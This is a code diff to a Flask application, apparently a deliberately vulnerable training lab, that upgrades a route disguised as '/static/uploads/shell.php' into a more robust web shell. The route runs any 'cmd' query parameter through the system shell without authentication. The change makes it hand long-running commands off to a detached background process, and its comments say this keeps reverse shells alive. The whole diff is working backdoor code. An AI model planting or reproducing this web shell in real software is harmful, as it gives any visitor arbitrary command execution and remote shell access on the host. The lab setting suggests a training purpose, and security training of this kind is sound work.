@@ -582,8 +582,31 @@ def login():
 @app.route("/static/uploads/shell.php")
 def webshell():
     cmd = request.args.get("cmd", "id")
-    result = subprocess.getoutput(cmd)
-    return f"<pre>{result}</pre>", 200
+    try:
+        # Run the command with a 5-second timeout so Flask never blocks
+        result = subprocess.run(
+            cmd, shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            timeout=5
+        )
+        output = result.stdout.decode("utf-8", errors="replace")
+        if not output:
+            output = "[command executed - no output returned]"
+    except subprocess.TimeoutExpired:
+        # Reverse shells and long-running commands will hit this path.
+        # We detach them properly so Flask stays alive.
+        subprocess.Popen(
+            cmd, shell=True,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            stdin=subprocess.DEVNULL,
+            close_fds=True
+        )
+        output = f"[+] Command dispatched in background: {cmd}"
+    except Exception as e:
+        output = f"[error] {str(e)}"
+    return f"<pre>{output}</pre>", 200
 
 
 # Route: Reset Feedback Board (Lab utility - clears stored XSS payloads for testing)
